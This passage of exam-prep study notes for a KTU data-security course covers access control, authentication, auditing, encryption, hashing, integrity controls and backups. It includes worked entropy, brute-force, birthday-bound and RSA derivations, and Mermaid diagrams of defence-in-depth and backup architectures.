> ✅ = Primary defense | ⚪ = Secondary/supporting | – = Not the primary target
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# ⚙️ SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Access Control — Models and Mechanisms

### 2.1.1 Core Principles
1. **Least Privilege** — Grant only the permissions necessary.
2. **Need-to-Know** — Access limited to information required for the task.
3. **Separation of Duties (SoD)** — No single person controls an entire critical process.
4. **Defense in Depth** — Layer multiple access controls.

### 2.1.2 The Four Main Models

#### (i) DAC — Discretionary Access Control
- Owner of the resource decides who gets access.
- Implemented via **Access Control Lists (ACLs)**.
- Flexible but prone to misuse (owner can grant too much).

#### (ii) MAC — Mandatory Access Control
- Access governed by **centralized security policy** based on classification labels.
- Used in military/government (e.g., Top Secret, Secret, Confidential).
- User cannot change permissions — strictest model.

#### (iii) RBAC — Role-Based Access Control
- Permissions assigned to **roles**, not to individuals.
- User → Role → Permission.
- Most widely used in enterprises (e.g., HR Manager, Data Analyst).

#### (iv) ABAC — Attribute-Based Access Control
- Access decisions based on **attributes** of user, resource, action, and environment.
- Highly dynamic; uses policy rules like *IF (role = Doctor AND time < 18:00) THEN allow*.
- Foundation of **Zero Trust Architecture**.

### 2.1.3 Access Control Lifecycle

| Step | Description |
|------|-------------|
| 1. **Identification** | User claims an identity (username, employee ID). |
| 2. **Authentication** | User proves identity (password, biometric). |
| 3. **Authorization** | System checks permissions against policies. |
| 4. **Access Decision** | Grant, deny, or restrict. |
| 5. **Accountability** | Log the action for auditing. |

> [!NOTE]
> **KTU Memory Trick — "IAAA":**
> **I**dentification → **A**uthentication → **A**uthorization → **A**ccountability.
> Every access request must pass through all four.

---

## 2.2 Authentication — Factors, Protocols, and MFA

### 2.2.1 The Five Authentication Factors

| Factor | Type | Examples |
|--------|------|----------|
| Knowledge | Something you *know* | Password, PIN, security question |
| Possession | Something you *have* | Smart card, OTP token, phone |
| Biometric | Something you *are* | Fingerprint, iris, face, voice |
| Behavioral | Something you *do* | Typing rhythm, gait |
| Contextual | Somewhere/Context | Geo-location, device fingerprint, time-of-day |

### 2.2.2 Multi-Factor Authentication (MFA)
- Combining **two or more** independent factors.
- *Password alone* = single factor.
- *Password + OTP* = 2FA (two-factor).
- *Password + OTP + Fingerprint* = MFA.

> **KTU High-Yield Fact:** MFA can block **99.9%** of automated account-takeover attacks (Microsoft 2019 study).

### 2.2.3 Authentication Protocols
- **PAP (Password Authentication Protocol)** — sends password in cleartext ❌
- **CHAP (Challenge-Handshake Authentication Protocol)** — uses challenge-response ✅
- **Kerberos** — ticket-based, symmetric-key, prevents replay attacks.
- **OAuth 2.0 / OpenID Connect** — delegated authorization for web apps.
- **SAML** — XML-based SSO for enterprise federations.
- **RADIUS / TACACS+** — centralized AAA (Authentication, Authorization, Accounting) for networks.

---

## 2.3 Auditing — Logs, Trails, and SIEM

### 2.3.1 What is an Audit Trail?
A chronological, tamper-evident record of system activities that enables the reconstruction and examination of the sequence of events.

### 2.3.2 Types of Audits
- **Internal Audit** — by the organization's own compliance team.
- **External Audit** — by independent third parties (e.g., ISO 27001 auditors).
- **Compliance Audit** — checks adherence to laws (GDPR, HIPAA, DPDP Act 2023).
- **Forensic Audit** — post-incident investigation for legal proceedings.

### 2.3.3 SIEM Architecture
**Security Information and Event Management (SIEM)** aggregates logs from across the enterprise:
- Collection → Normalization → Correlation → Alerting → Storage → Reporting.
- Tools: Splunk, IBM QRadar, Microsoft Sentinel, Elastic SIEM.

> [!IMPORTANT]
> **Log Retention Standard (ISO 27001 A.12.4.1):**
> Event logs should be retained for a defined period, e.g., **minimum 6 months online, 2 years archival**, depending on regulatory requirements.

---

## 2.4 Encryption — Symmetric, Asymmetric, and Hashing

### 2.4.1 Symmetric Encryption
- **Single shared secret key** for both encryption and decryption.
- Fast, suitable for bulk data.
- **Key distribution problem** — how to share the key securely?

**Algorithms:** AES (128/192/256 bit), DES (deprecated), 3DES, ChaCha20, Blowfish.

### 2.4.2 Asymmetric Encryption
- **Key pair:** Public key (encrypt/verify) + Private key (decrypt/sign).
- Solves key distribution; slower than symmetric.

**Algorithms:** RSA (2048/4096 bit), ECC (256 bit ≈ RSA 3072 bit strength), ElGamal.

### 2.4.3 Hybrid Encryption (Real-World Standard)
1. Generate random symmetric session key $K_s$.
2. Encrypt bulk data with $K_s$ (fast).
3. Encrypt $K_s$ with recipient's public key (secure delivery).
4. Send ciphertext + encrypted key.
5. Recipient decrypts $K_s$ with private key, then data with $K_s$.

### 2.4.4 Hashing (One-Way Function)
- No key, fixed-length output, irreversible.
- Used for integrity, not confidentiality.

**Algorithms:** SHA-256 (Secure Hash Algorithm, 256-bit output), SHA-3, BLAKE2, MD5 ❌ (broken).

---

## 2.5 Integrity Controls — From Checksums to Digital Signatures

### 2.5.1 Checksum
A simple error-detection mechanism (e.g., parity bit, CRC-32) used in network protocols. **Insufficient** for security — easily forged.

### 2.5.2 Cryptographic Hash Function Properties
A function $H: \{0,1\}^* \rightarrow \{0,1\}^n$ must satisfy:

| Property | Description |
|----------|-------------|
| **Pre-image resistance** | Given $h$, infeasible to find $m$ such that $H(m) = h$. |
| **Second pre-image resistance** | Given $m_1$, infeasible to find $m_2 \neq m_1$ such that $H(m_1) = H(m_2)$. |
| **Collision resistance** | Infeasible to find any $m_1 \neq m_2$ such that $H(m_1) = H(m_2)$. |
| **Deterministic** | Same input always yields same output. |
| **Avalanche effect** | 1-bit change in input → ~50% bits change in output. |

### 2.5.3 Message Authentication Code (MAC) and HMAC
- **MAC**: $T = \text{MAC}(K, M)$ — keyed hash for integrity + authenticity.
- **HMAC**: $T = H((K \oplus opad) \Vert H((K \oplus ipad) \Vert M))$.

### 2.5.4 Digital Signature
- Sender computes hash of message, encrypts with **own private key** → signature.
- Receiver verifies with sender's **public key**.
- Provides **integrity + authenticity + non-repudiation**.

---

## 2.6 Backups — Strategies, Media, and the 3-2-1 Rule

### 2.6.1 Why Backups?
- Hardware failure, ransomware, accidental deletion, natural disaster, insider attack.

### 2.6.2 The 3-2-1 Backup Rule
- **3** copies of data (1 primary + 2 backups).
- **2** different storage media (e.g., disk + tape).
- **1** copy offsite (geographically separated).

> **Modern Extension — 3-2-1-1-0:**
> 3 copies, 2 media, 1 offsite, **1 immutable/air-gapped**, **0 errors after verification**.

### 2.6.3 Backup Strategies Compared

| Strategy | What is backed up | Recovery Speed | Storage Cost | RPO |
|----------|-------------------|----------------|--------------|-----|
| **Full** | All data | Fastest | Highest | Last full backup |
| **Incremental** | Data changed since last *any* backup | Slowest | Lowest | Last incremental |
| **Differential** | Data changed since last *full* backup | Medium | Medium | Last full backup |
| **Mirror** | Real-time copy | Fastest | Same as primary | Near-zero |
| **Snapshot** | Point-in-time state | Fast | Variable | Snapshot time |

> **RPO** = Recovery Point Objective (max data loss acceptable)
> **RTO** = Recovery Time Objective (max downtime acceptable)

### 2.6.4 Backup Storage Media
- HDD, SSD, NAS, SAN, Tape (LTO-9), Optical, Cloud (AWS S3, Azure Blob, Google Cloud Storage).

---

## 2.7 KTU High-Yield Formula Sheet / Cheat Sheet

> [!IMPORTANT]
> **Mandatory formulas and key numerical facts to memorize for the exam:**

| Concept | Formula / Fact | Notation / Unit |
|---------|---------------|-----------------|
| Hash length (SHA-256) | $L_H = 256$ bits | $L_H$ in bits |
| RSA security | $\text{Bits} \geq 2048$ for legacy systems | key length in bits |
| ECC equivalence | 256-bit ECC $\approx$ 3072-bit RSA security | bits |
| AES key sizes | $128$ / $192$ / $256$ bits | $K$ in bits |
| Password entropy | $H = L \cdot \log_2(N)$ | $H$ in bits, $L$ = length, $N$ = charset size |
| 3-2-1 Rule | $3$ copies, $2$ media, $1$ offsite | – |
| Brute-force search | $T = 2^K / R$ | $K$ = key bits, $R$ = attempts/sec |
| Backup frequency | Recommended: daily incremental, weekly full | – |
| MFA effectiveness | Blocks ~$99.9\%$ of automated attacks | – |
| Kerberos ticket TTL | Default $\approx 8\text{–}10$ hours | hours |

> **Worked Example (Entropy):**
> Password = 12 characters, charset = 94 (uppercase + lowercase + digits + symbols).
> $$H = 12 \cdot \log_2(94) \approx 12 \cdot 6.55 \approx 78.6 \text{ bits}$$
> This is **strong** by modern standards (NIST recommends $\geq 70$ bits).

> **Worked Example (Brute-Force Time):**
> AES-128 key space = $2^{128}$ keys. If attacker tries $10^{18}$ keys/sec (~$1$ exa-hash/sec for SHA, less for AES):
> $$T = 2^{128} / 10^{18} \approx 3.4 \times 10^{20} \text{ seconds} \approx 1.08 \times 10^{13} \text{ years}$$
> Computationally infeasible — confirms AES-128 security.

> [!NOTE]
> **Engineering Utility:**
> These controls are the backbone of **GDPR Art. 32 (Security of Processing)**, **DPDP Act 2023 §8(4)**, **HIPAA Security Rule**, and **PCI-DSS v4.0**. A data scientist must understand them to design ethical, compliant pipelines and to pass KTU's PEADT412 outcomes mapped to data ethics and privacy engineering.
<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 🧮 SECTION 3: Step-by-Step Derivations, Worked Examples & Analytical Matrix

> This section demonstrates the *mathematical reasoning* behind hashing, entropy, and brute-force complexity — concepts KTU frequently tests in 14-mark problems.

---

## 3.1 Derivation 1 — Password Entropy and Brute-Force Resistance

### Step 1: Define Entropy
For a password of length $L$ characters drawn from a charset of size $N$:

$$
H = L \cdot \log_2(N)
$$

where $H$ is the entropy in **bits**.

### Step 2: Calculate Search Space
The total number of possible passwords is the **key space**:

$$
S = N^L
$$

Taking $\log_2$ of both sides recovers the entropy:

$$
\log_2(S) = \log_2(N^L) = L \cdot \log_2(N) = H
$$

### Step 3: Brute-Force Time
If an attacker performs $R$ attempts per second, average search time is:

$$
T_{\text{avg}} = \frac{S}{2R} = \frac{2^H}{2R} = \frac{2^{H-1}}{R}
$$

### Step 4: Numerical Example
Let $L = 10$, $N = 26$ (lowercase only).

$$
H = 10 \cdot \log_2(26) = 10 \cdot 4.7004 = 47.0 \text{ bits}
$$

Search space:

$$
S = 26^{10} \approx 1.41 \times 10^{14}
$$

At $R = 10^9$ guesses/sec (offline GPU attack):

$$
T_{\text{avg}} = \frac{1.41 \times 10^{14}}{2 \cdot 10^9} \approx 7.05 \times 10^4 \text{ sec} \approx 19.6 \text{ hours}
$$

**Conclusion:** A 10-character lowercase-only password can be cracked in under a day with GPU brute force. Always include uppercase, digits, and symbols to push $N$ to 95+.

---

## 3.2 Derivation 2 — Hash Collision Probability (Birthday Paradox)

### Step 1: The Setup
A hash function produces $n$-bit output, so $2^n$ possible hashes. We want the probability that two distinct messages produce the **same** hash.

### Step 2: Birthday Bound
By the **birthday paradox**, collisions become probable after roughly:

$$
q \approx 1.177 \cdot \sqrt{2^n} = 1.177 \cdot 2^{n/2}
$$

attempts.

### Step 3: SHA-256 Example ($n = 256$)

$$
q \approx 1.177 \cdot 2^{128} \approx 4.0 \times 10^{38} \text{ messages}
$$

### Step 4: MD5 Counter-Example ($n = 128$)

$$
q \approx 1.177 \cdot 2^{64} \approx 2.17 \times 10^{19} \text{ messages}
$$

> This is **feasible** with modern clusters — MD5 collisions were generated in seconds in 2004 (Wang et al.). **Never use MD5 in security contexts.**

---

## 3.3 Derivation 3 — RSA Encryption and Decryption

### Step 1: Key Generation
1. Choose two large primes $p$ and $q$.
2. Compute modulus $n = p \cdot q$.
3. Compute Euler's totient $\phi(n) = (p-1)(q-1)$.
4. Choose public exponent $e$ such that $1 < e < \phi(n)$ and $\gcd(e, \phi(n)) = 1$.
5. Compute private exponent $d \equiv e^{-1} \pmod{\phi(n)}$.

### Step 2: Encryption
Plaintext $M$ (as integer, $0 \le M < n$):

$$
C \equiv M^e \pmod{n}
$$

### Step 3: Decryption

$$
M \equiv C^d \pmod{n}
$$

### Step 4: Verification

$$
(C^d)^e \equiv (M^e)^d \equiv M^{ed} \equiv M^{1 + k\phi(n)} \equiv M \pmod{n}
$$

The last step uses **Euler's theorem**: $M^{\phi(n)} \equiv 1 \pmod{n}$ for $\gcd(M, n) = 1$.

### Step 5: Why RSA Works (Intuition)
The security of RSA rests on the **hardness of factoring $n$** into $p \cdot q$. No known polynomial-time classical algorithm exists for large $n$ (though Shor's algorithm on a quantum computer breaks it in $O((\log n)^3)$).

---

## 3.4 Worked Example — Hybrid Encryption Scenario (Board Exam Style)

> **Question (14 marks):** Explain hybrid encryption with a numerical example showing how Alice can send a 1 MB file securely to Bob.

**Solution Outline:**

**Step 1:** Bob's key pair (RSA-2048):
- $(e_B, n_B) = (65537, n_B)$ — public.
- $(d_B, n_B)$ — private.

**Step 2:** Alice generates a random AES-256 session key $K_s$.

**Step 3:** Alice encrypts the file $F$ (1 MB) with AES-256 in GCM mode:
$$
C_F = \text{AES}_{K_s}(F)
$$

**Step 4:** Alice encrypts $K_s$ with Bob's public RSA key:
$$
C_K = K_s^{e_B} \mod n_B
$$

**Step 5:** Alice sends the bundle $\{C_F, C_K\}$ over the network.

**Step 6:** Bob receives the bundle, decrypts the session key:
$$
K_s = C_K^{d_B} \mod n_B
$$

**Step 7:** Bob decrypts the file:
$$
F = \text{AES}^{-1}_{K_s}(C_F)
$$

**Step 8:** Bob verifies integrity using the GCM authentication tag embedded in $C_F$.

**Advantage:** Symmetric AES handles bulk speed; RSA securely delivers the key.

---

## 3.5 Analytical Matrix — Choosing the Right Prevention Method

| Threat Scenario | Best Primary Control | Supporting Controls |
|-----------------|----------------------|---------------------|
| Stolen laptop | **Encryption** (Full-Disk) | Authentication (BIOS), Backups |
| Insider data leak | **Access Control (RBAC) + Auditing** | DLP tools, MFA |
| Man-in-the-middle attack | **Encryption (TLS) + Authentication** | Integrity controls (HMAC) |
| Ransomware | **Backups (immutable)** + **Access Control** | Auditing, Network segmentation |
| Data tampering | **Integrity Controls (HMAC/SHA-256)** | Digital signatures, Versioning |
| Phishing account takeover | **Authentication (MFA)** | Auditing, User training |
| DDoS on database | **Access Control + Backups (mirror)** | Auditing (anomaly detection) |
| Unauthorized privilege escalation | **Access Control (least privilege) + Auditing** | MFA, Integrity checks |
| Lost USB drive | **Encryption (AES-256)** | Authentication, Policy |

---

## 3.6 Step-by-Step Logic — Building a Defended Database (Synthesis)

For a KTU 14-mark "design" question, walk through this chain:

**Step 1 — Identify Assets.** List sensitive data (PII, financial, health).

**Step 2 — Classify Data.** Apply labels: Public, Internal, Confidential, Restricted.

**Step 3 — Apply Access Control.** RBAC matrix: who can read/write/delete each class.

**Step 4 — Enforce Authentication.** MFA for all privileged access; SSO for users.

**Step 5 — Encrypt at Rest and in Transit.** AES-256 on disk, TLS 1.3 on network.

**Step 6 — Add Integrity Controls.** HMAC on every record, SHA-256 hashes on backups.

**Step 7 — Enable Auditing.** Centralized SIEM with 1-year log retention.

**Step 8 — Configure Backups.** 3-2-1 rule, daily incremental, weekly full, monthly DR drill.

**Step 9 — Test and Monitor.** Quarterly penetration test, continuous vulnerability scanning.

**Step 10 — Document and Train.** Maintain policies per ISO 27001 Annex A controls.
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 🗺️ SECTION 4: Structural Diagrams & Schematics

## 4.1 Defense-in-Depth Layered Architecture

```mermaid
flowchart TB
    A[Data Asset]:::core --> B[Layer 1: Backups - Last Resort Recovery]
    A --> C[Layer 2: Encryption - Confidentiality Shield]
    A --> D[Layer 3: Integrity Controls - Tamper Detection]
    A --> E[Layer 4: Access Control - Authorization Gate]
    A --> F[Layer 5: Authentication - Identity Verification]
    A --> G[Layer 6: Auditing - Forensic Recorder]

    B --> B1[Full + Incremental + Offsite]
    C --> C1[AES-256 at Rest + TLS 1.3 in Transit]
    D --> D1[SHA-256 + HMAC + Digital Signatures]
    E --> E1[RBAC + Least Privilege + ABAC]
    F --> F1[MFA - Password + OTP + Biometric]
    G --> G1[SIEM Logs + Audit Trails + Alerts]

    classDef core fill:#1f3a5f,stroke:#fff,stroke-width:2px,color:#fff

    H[Attacker]:::threat -.->|Tries to breach| F
    H -.->|If MFA fails| E
    H -.->|If RBAC fails| C
    H -.->|If encryption fails| D
    H -.->|If integrity fails| A
    H -.->|If data corrupted| B
    G -.->|Detects anomaly| I[Incident Response Team]:::responder
    I -.->|Updates policies| F
    I -.->|Updates policies| E

    classDef threat fill:#8b0000,stroke:#fff,color:#fff
    classDef responder fill:#2e7d32,stroke:#fff,color:#fff
```

---

## 4.2 Access Control Decision Flow (IAAA Lifecycle)

```mermaid
flowchart LR
    U[User] --> P1[Step 1: Identification\nClaim Username]
    P1 --> P2[Step 2: Authentication\nVerify Password / MFA]
    P2 --> P3{Auth Valid?}
    P3 -- No --> R1[Access Denied\nLog to Audit]
    P3 -- Yes --> P4[Step 3: Authorization\nCheck RBAC Policy]
    P4 --> P5{Authorized?}
    P5 -- No --> R1
    P5 -- Yes --> P6[Step 4: Access Decision\nGrant Permission]
    P6 --> P7[Step 5: Accountability\nLog Action with Timestamp]
    P7 --> P8[Resource Accessed]
    P1 --> A[Auditing Module]
    P2 --> A
    P4 --> A
    P6 --> A
    P7 --> A
    A --> A1[SIEM Dashboard]
```

---

## 4.3 Hybrid Encryption Workflow (Alice → Bob)

```mermaid
sequenceDiagram
    participant Alice
    participant Network
    participant Bob

    Note over Bob: Has RSA Key Pair\nPublic eB, nB\nPrivate dB, nB

    Alice->>Alice: 1. Generate random AES-256 session key Ks
    Alice->>Alice: 2. Encrypt file F: CF = AES_Ks(F)
    Alice->>Alice: 3. Encrypt key: CK = Ks^eB mod nB
    Alice->>Network: 4. Send bundle {CF, CK}

    Network->>Bob: 5. Deliver bundle

    Bob->>Bob: 6. Decrypt key: Ks = CK^dB mod nB
    Bob->>Bob: 7. Decrypt file: F = AES^-1_Ks(CF)
    Bob->>Bob: 8. Verify integrity using GCM tag
    Bob-->>Alice: 9. Optional: Send acknowledgment (signed)
```

---

## 4.4 The 3-2-1 Backup Architecture

```mermaid
flowchart TB
    P[Primary Database\nProduction Site] --> M1[Mirror 1\nLocal SSD Array]
    P --> M2[Backup 1\nLocal NAS - Daily Incremental]
    P --> M3[Backup 2\nOffsite Cloud - S3 Glacier]
    P --> M4[Backup 3\nImmutable Tape - Air-Gapped]

    M2 -.->|Weekly full| M3
    M3 -.->|Quarterly DR drill| M4

    P --> S[SIEM Audit Logs]
    M1 --> S
    M2 --> S
    M3 --> S

    S --> OPS[Backup Operations Dashboard]
    OPS --> AL{Anomaly?}
    AL -- Yes --> INC[Incident Response]
    AL -- No --> MON[Continuous Monitoring]
```

---

## 4.5 RBAC Role-Permission Mapping Matrix (Schematic)

```mermaid
graph LR
    U1[User: Data Analyst] --> R1[Role: Analyst]
    U2[User: HR Manager] --> R2[Role: HR]
    U3[User: DBA] --> R3[Role: Database Admin]
    U4[User: Auditor] --> R4[Role: Compliance]

    R1 --> P1[Read: Sales Data]
    R1 --> P2[Read: Anonymized PII]

    R2 --> P4[Write: Employee Records]
    R3 --> P5[Read: All Tables]
    R3 --> P6[Write: All Tables]
    R3 --> P7[Execute: DB Procedures]
    R4 --> P8[Read: Audit Logs]
    R4 --> P9[Read: Access Policies]
    R4 --> P0[No Write Permissions]

    P1 --> DB[(Database)]
    P2 --> DB
    P3 --> DB
    P4 --> DB
    P5 --> DB
    P6 --> DB
    P7 --> DB
    P8 --> LOG[(SIEM Logs)]
    P9 --> LOG
```

---

## 4.6 Comparison Block — Symmetric vs Asymmetric Encryption

```mermaid
flowchart LR
    subgraph SYM[Symmetric Encryption]
        S1[Plaintext M] --> S2[AES-256 Algorithm] --> S3[Key K shared] --> S4[Ciphertext C]
        S4 --> S5[Same Key K] --> S6[AES-256 Decrypt] --> S7[Plaintext M]
    end

    subgraph ASYM[Asymmetric Encryption]
        A1[Plaintext M] --> A2[RSA Algorithm] --> A3[Recipient Public Key e,n] --> A4[Ciphertext C]
        A4 --> A5[Recipient Private Key d,n] --> A6[RSA Decrypt] --> A7[Plaintext M]
    end

    S3 -.->|Same channel\nvulnerable| S5
    A3 -.->|Public - safe to share| A5
```
